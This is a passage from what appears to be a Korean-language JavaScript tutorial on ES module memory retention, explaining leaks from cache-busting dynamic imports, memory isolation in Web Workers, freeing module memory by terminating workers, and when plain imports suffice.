<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 매번 새로운 모듈 인스턴스 생성 = 메모리 누수!</span>
</span><span class="code-line line-number" line="2"><span class="token keyword control-flow">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="3">  <span class="token keyword">const</span> mod <span class="token operator">=</span> <span class="token keyword control-flow">await</span> <span class="token keyword module">import</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">./module.js?v=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>i<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="4">  <span class="token comment">// 각각 별도의 모듈로 취급되어 100개 모두 메모리에 남음!</span>
</span><span class="code-line line-number" line="5"><span class="token punctuation">}</span>
</span></code></pre></div></div>
<p>쿼리 매개변수를 사용한 캐시 무효화(<code>import(\</code>./module.js?t=$<!-- -->1757580422375<!-- -->`)`)는 새로운 모듈 인스턴스를 강제하지만, <strong>이전 인스턴스가 제거되지 않고 계속 누적되어</strong> 심각한 메모리 누수를 야기합니다.</p>
<h4 id="-실제-메모리-영향">📊 실제 메모리 영향</h4>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// SPA에서 라우트별 동적 import</span>
</span><span class="code-line line-number" line="2"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">loadRoute</span><span class="token punctuation">(</span><span class="token parameter">routeName</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="3">  <span class="token keyword control-flow">return</span> <span class="token keyword control-flow">await</span> <span class="token keyword module">import</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">./routes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>routeName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.js</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="4"><span class="token punctuation">}</span>
</span><span class="code-line line-number" line="5">
</span><span class="code-line line-number" line="6"><span class="token comment">// 사용자가 20개 라우트를 방문하면:</span>
</span><span class="code-line line-number" line="7"><span class="token comment">// → 20개 모듈 모두 메모리에 영구 보존</span>
</span><span class="code-line line-number" line="8"><span class="token comment">// → 각 라우트가 10MB라면 = 200MB 영구 점유</span>
</span></code></pre></div></div>
<h3 id="웹-워커와-모듈-메모리-격리">웹 워커와 모듈 메모리 격리</h3>
<h4 id="-웹-워커의-독립적인-모듈-레지스트리">🔐 웹 워커의 독립적인 모듈 레지스트리</h4>
<p>웹 워커는 <strong>완전히 독립된 JavaScript 실행 환경</strong>을 제공하며, 각 워커는 자체 모듈 레지스트리를 보유합니다:</p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 메인 스레드</span>
</span><span class="code-line line-number" line="2"><span class="token keyword">const</span> worker1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">&#x27;/worker.js&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">&#x27;module&#x27;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="3"><span class="token keyword">const</span> worker2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">&#x27;/worker.js&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">&#x27;module&#x27;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="4">
</span><span class="code-line line-number" line="5"><span class="token comment">// worker.js</span>
</span><span class="code-line line-number" line="6"><span class="token keyword module">import</span> <span class="token imports"><span class="token punctuation">{</span> heavyModule <span class="token punctuation">}</span></span> <span class="token keyword module">from</span> <span class="token string">&#x27;./heavy-module.js&#x27;</span><span class="token punctuation">;</span>  <span class="token comment">// 10MB 모듈</span>
</span><span class="code-line line-number" line="7">
</span><span class="code-line line-number" line="8"><span class="token comment">// 결과:</span>
</span><span class="code-line line-number" line="9"><span class="token comment">// - 메인 스레드: heavy-module.js 로드 안 됨</span>
</span><span class="code-line line-number" line="10"><span class="token comment">// - Worker 1: heavy-module.js 독립 인스턴스 (10MB)</span>
</span><span class="code-line line-number" line="11"><span class="token comment">// - Worker 2: heavy-module.js 또 다른 독립 인스턴스 (10MB)</span>
</span><span class="code-line line-number" line="12"><span class="token comment">// → 총 20MB 메모리 사용!</span>
</span></code></pre></div></div>
<h4 id="-메모리-격리의-장단점">📊 메모리 격리의 장단점</h4>
<p><strong>장점:</strong></p>
<ul>
<li>✅ <strong>완벽한 격리</strong>: 워커 간 모듈 상태 간섭 없음</li>
<li>✅ <strong>독립적 GC</strong>: 워커 종료 시 해당 워커의 모든 모듈 메모리 해제</li>
<li>✅ <strong>보안 강화</strong>: 워커 간 코드 공유 불가능</li>
</ul>
<p><strong>단점:</strong></p>
<ul>
<li>❌ <strong>메모리 중복</strong>: 같은 모듈도 워커마다 별도 로드</li>
<li>❌ <strong>초기화 비용</strong>: 각 워커가 모듈을 처음부터 평가</li>
<li>❌ <strong>캐시 비효율</strong>: 모듈 캐싱 이점 없음</li>
</ul>
<h4 id="-워커-종료로-모듈-메모리-해제하기">🎯 워커 종료로 모듈 메모리 해제하기</h4>
<p><strong>웹 워커만이 ES6 모듈 메모리를 실제로 해제할 수 있는 유일한 방법입니다:</strong></p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 메인 스레드</span>
</span><span class="code-line line-number" line="2"><span class="token keyword">let</span> worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">&#x27;/heavy-worker.js&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">&#x27;module&#x27;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="3">
</span><span class="code-line line-number" line="4"><span class="token comment">// heavy-worker.js</span>
</span><span class="code-line line-number" line="5"><span class="token keyword module">import</span> <span class="token imports"><span class="token punctuation">{</span> process <span class="token punctuation">}</span></span> <span class="token keyword module">from</span> <span class="token string">&#x27;./huge-library.js&#x27;</span><span class="token punctuation">;</span>  <span class="token comment">// 50MB 라이브러리</span>
</span><span class="code-line line-number" line="6">self<span class="token punctuation">.</span><span class="token method-variable function-variable method function property-access">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token arrow operator">=&gt;</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="7">  <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token property-access">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="8">  self<span class="token punctuation">.</span><span class="token method function property-access">postMessage</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="9"><span class="token punctuation">}</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="10">
</span><span class="code-line line-number" line="11"><span class="token comment">// 작업 완료 후 워커 종료</span>
</span><span class="code-line line-number" line="12">worker<span class="token punctuation">.</span><span class="token method function property-access">terminate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ← 50MB 완전히 해제됨! 🎉</span>
</span><span class="code-line line-number" line="13">worker <span class="token operator">=</span> <span class="token keyword null nil">null</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="14">
</span><span class="code-line line-number" line="15"><span class="token comment">// 필요시 새 워커 생성 (모듈 다시 로드)</span>
</span><span class="code-line line-number" line="16">worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">&#x27;/heavy-worker.js&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">&#x27;module&#x27;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre></div></div>
<h4 id="-핵심-전략-워커를-통한-프로그래밍적-메모리-관리">💡 핵심 전략: 워커를 통한 프로그래밍적 메모리 관리</h4>
<p><strong>맞습니다! 워커 + onmessage 패턴으로 ES6 모듈의 메모리를 제어할 수 있습니다:</strong></p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 🔴 메인 스레드: 모듈 영구 보존</span>
</span><span class="code-line line-number" line="2"><span class="token keyword module">import</span> <span class="token imports"><span class="token punctuation">{</span> heavyProcess <span class="token punctuation">}</span></span> <span class="token keyword module">from</span> <span class="token string">&#x27;./heavy-lib.js&#x27;</span><span class="token punctuation">;</span>  <span class="token comment">// 영구 메모리 점유</span>
</span><span class="code-line line-number" line="3"><span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token function">heavyProcess</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="4">
</span><span class="code-line line-number" line="5"><span class="token comment">// 🟢 워커 패턴: 필요할 때만 메모리 사용</span>
</span><span class="code-line line-number" line="6"><span class="token keyword">class</span> <span class="token class-name">ModuleExecutor</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="7">  <span class="token keyword">async</span> <span class="token function">executeWithModule</span><span class="token punctuation">(</span><span class="token parameter">modulePath<span class="token punctuation">,</span> methodName<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="8">    <span class="token comment">// 1. 워커 생성 (모듈 로드)</span>
</span><span class="code-line line-number" line="9">    <span class="token keyword">const</span> worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">&#x27;/executor-worker.js&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">&#x27;module&#x27;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="10">    
</span><span class="code-line line-number" line="11">    <span class="token comment">// 2. 작업 실행</span>
</span><span class="code-line line-number" line="12">    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword control-flow">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token arrow operator">=&gt;</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="13">      worker<span class="token punctuation">.</span><span class="token method-variable function-variable method function property-access">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token arrow operator">=&gt;</span> <span class="token function">resolve</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token property-access">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="14">      worker<span class="token punctuation">.</span><span class="token property-access">onerror</span> <span class="token operator">=</span> reject<span class="token punctuation">;</span>
</span><span class="code-line line-number" line="15">      worker<span class="token punctuation">.</span><span class="token method function property-access">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">{</span> modulePath<span class="token punctuation">,</span> methodName<span class="token punctuation">,</span> data <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="16">    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="17">    
</span><span class="code-line line-number" line="18">    <span class="token comment">// 3. 워커 종료 (모듈 메모리 해제!)</span>
</span><span class="code-line line-number" line="19">    worker<span class="token punctuation">.</span><span class="token method function property-access">terminate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="20">    
</span><span class="code-line line-number" line="21">    <span class="token keyword control-flow">return</span> result<span class="token punctuation">;</span>
</span><span class="code-line line-number" line="22">  <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="23"><span class="token punctuation">}</span>
</span><span class="code-line line-number" line="24">
</span><span class="code-line line-number" line="25"><span class="token comment">// executor-worker.js</span>
</span><span class="code-line line-number" line="26">self<span class="token punctuation">.</span><span class="token method-variable function-variable method function property-access">onmessage</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token arrow operator">=&gt;</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="27">  <span class="token keyword">const</span> <span class="token punctuation">{</span> modulePath<span class="token punctuation">,</span> methodName<span class="token punctuation">,</span> data <span class="token punctuation">}</span> <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token property-access">data</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="28">  
</span><span class="code-line line-number" line="29">  <span class="token comment">// 동적으로 모듈 로드</span>
</span><span class="code-line line-number" line="30">  <span class="token keyword">const</span> module <span class="token operator">=</span> <span class="token keyword control-flow">await</span> <span class="token keyword module">import</span><span class="token punctuation">(</span>modulePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="31">  
</span><span class="code-line line-number" line="32">  <span class="token comment">// 메서드 실행</span>
</span><span class="code-line line-number" line="33">  <span class="token keyword">const</span> result <span class="token operator">=</span> module<span class="token punctuation">[</span>methodName<span class="token punctuation">]</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="34">  
</span><span class="code-line line-number" line="35">  <span class="token comment">// 결과 반환</span>
</span><span class="code-line line-number" line="36">  self<span class="token punctuation">.</span><span class="token method function property-access">postMessage</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="37">  <span class="token comment">// 워커 종료 시 이 모듈도 함께 해제됨!</span>
</span><span class="code-line line-number" line="38"><span class="token punctuation">}</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="39">
</span><span class="code-line line-number" line="40"><span class="token comment">// 사용 예</span>
</span><span class="code-line line-number" line="41"><span class="token keyword">const</span> executor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModuleExecutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="42">
</span><span class="code-line line-number" line="43"><span class="token comment">// heavy-lib.js를 필요할 때만 로드하고 즉시 해제</span>
</span><span class="code-line line-number" line="44"><span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword control-flow">await</span> executor<span class="token punctuation">.</span><span class="token method function property-access">executeWithModule</span><span class="token punctuation">(</span>
</span><span class="code-line line-number" line="45">  <span class="token string">&#x27;./heavy-lib.js&#x27;</span><span class="token punctuation">,</span> 
</span><span class="code-line line-number" line="46">  <span class="token string">&#x27;processData&#x27;</span><span class="token punctuation">,</span> 
</span><span class="code-line line-number" line="47">  myData
</span><span class="code-line line-number" line="48"><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="49"><span class="token comment">// heavy-lib.js 메모리 완전 해제됨! ✨</span>
</span></code></pre></div></div>
<h4 id="️-트레이드오프-정리">⚖️ 트레이드오프 정리</h4>
<table><thead><tr><th>접근 방식</th><th>메모리 관리</th><th>성능</th><th>복잡도</th></tr></thead><tbody><tr><td><strong>메인 스레드 import</strong></td><td>❌ 영구 보존</td><td>⚡ 빠른 재사용</td><td>😊 단순</td></tr><tr><td><strong>워커 일회성 사용</strong></td><td>✅ 완전 해제 가능</td><td>🐢 매번 재로드</td><td>😐 중간</td></tr><tr><td><strong>워커 풀 재사용</strong></td><td>🔄 선택적 해제</td><td>⚡ 균형적</td><td>😅 복잡</td></tr></tbody></table>
<p><strong>결론: 큰 라이브러리나 가끔 사용하는 모듈은 워커 패턴으로 메모리를 절약할 수 있습니다!</strong></p>
<h4 id="️-현실적인-사용-권장사항">⚠️ 현실적인 사용 권장사항</h4>
<p><strong>워커 패턴은 일반적인 해결책이 아닙니다!</strong> 실제로는 다음과 같이 접근합니다:</p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 🟢 일반적인 경우: 그냥 import 사용 (99% 케이스)</span>
</span><span class="code-line line-number" line="2"><span class="token keyword module">import</span> <span class="token imports"><span class="token punctuation">{</span> utils <span class="token punctuation">}</span></span> <span class="token keyword module">from</span> <span class="token string">&#x27;./utils.js&#x27;</span><span class="token punctuation">;</span>  <span class="token comment">// 대부분 OK</span>
</span><span class="code-line line-number" line="3"><span class="token keyword module">import</span> <span class="token imports"><span class="token punctuation">{</span> format <span class="token punctuation">}</span></span> <span class="token keyword module">from</span> <span class="token string">&#x27;date-fns&#x27;</span><span class="token punctuation">;</span>    <span class="token comment">// 라이브러리도 OK</span>
</span><span class="code-line line-number" line="4">
</span><span class="code-line line-number" line="5"><span class="token comment">// 🟡 주의가 필요한 경우: 메모리 관리 전략 적용</span>
</span><span class="code-line line-number" line="6"><span class="token comment">// 1. 큰 데이터 캐시</span>
</span><span class="code-line line-number" line="7"><span class="token keyword">const</span> cache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="8"><span class="token keyword">const</span> <span class="token constant">MAX_CACHE_SIZE</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>  <span class="token comment">// 크기 제한 필수!</span>
</span><span class="code-line line-number" line="9">
</span><span class="code-line line-number" line="10"><span class="token comment">// 2. 이벤트 리스너</span>
</span><span class="code-line line-number" line="11"><span class="token keyword">let</span> cleanup <span class="token operator">=</span> <span class="token keyword null nil">null</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="12"><span class="token keyword module">export</span> <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="13">  <span class="token function-variable function">cleanup</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token arrow operator">=&gt;</span> <span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">&#x27;resize&#x27;</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="14">  <span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#x27;resize&#x27;</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="15"><span class="token punctuation">}</span>
</span><span class="code-line line-number" line="16"><span class="token keyword module">export</span> <span class="token keyword">function</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="17">  cleanup<span class="token operator">?.</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="18"><span class="token punctuation">}</span>
</span><span class="code-line line-number" line="19">
</span><span class="code-line line-number" line="20"><span class="token comment">// 🔴 워커 패턴이 필요한 특수 케이스 (1% 미만)</span>
</span><span class="code-line line-number" line="21"><span class="token comment">// - 수백 MB 이상의 거대 라이브러리</span>
</span><span class="code-line line-number" line="22"><span class="token comment">// - 한 번만 실행되는 무거운 초기화 작업</span>
</span><span class="code-line line-number" line="23"><span class="token comment">// - 메모리 민감한 환경 (임베디드 브라우저 등)</span>
</span></code></pre></div></div>
<h4 id="-실무에서의-우선순위">📊 실무에서의 우선순위</h4>
<ol>
<li>
<p><strong>첫 번째 선택: 일반 import</strong> (95% 이상)</p>
<ul>
<li>간단하고 빠름</li>
<li>대부분의 앱은 메모리 문제 없음</li>
<li>브라우저 최적화 활용</li>
</ul>
</li>
<li>
<p><strong>두 번째 선택: 스마트한 메모리 관리</strong> (4%)</p>
<ul>
<li>Map/Set 크기 제한</li>
<li>TTL 구현</li>
<li>명시적 cleanup 함수</li>
</ul>
</li>
<li>
<p><strong>마지막 선택: 워커 패턴</strong> (1% 미만)</p>
<ul>
<li>정말 큰 라이브러리 (100MB+)</li>
<li>메모리가 극도로 제한된 환경</li>
<li>복잡도를 감수할 만한 명확한 이유</li>
</ul>
</li>
</ol>
<h4 id="-실용적-조언">🎯 실용적 조언</h4>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// ✅ 대부분의 경우 이것으로 충분</span>
</span><span class="code-line line-number" line="2"><span class="token keyword module">import</span> <span class="token imports"><span class="token punctuation">{</span> myFunction <span class="token punctuation">}</span></span> <span class="token keyword module">from</span> <span class="token string">&#x27;./my-module.js&#x27;</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="3">
</span><span class="code-line line-number" line="4"><span class="token comment">// ❌ 과도한 최적화 (불필요한 복잡도)</span>
</span><span class="code-line line-number" line="5"><span class="token keyword">const</span> worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">&#x27;./worker.js&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="6"><span class="token comment">// 10KB 모듈을 위해 워커 사용? No!</span>
</span></code></pre></div></div>
<p><strong>워커 패턴은 &quot;알아두면 좋은 고급 기법&quot;이지, 기본 접근법이 아닙니다!</strong></p>
<h4 id="-sharedarraybuffer를-통한-메모리-공유">💡 SharedArrayBuffer를 통한 메모리 공유</h4>
<p>워커 간 중복 메모리를 줄이기 위한 전략:</p>
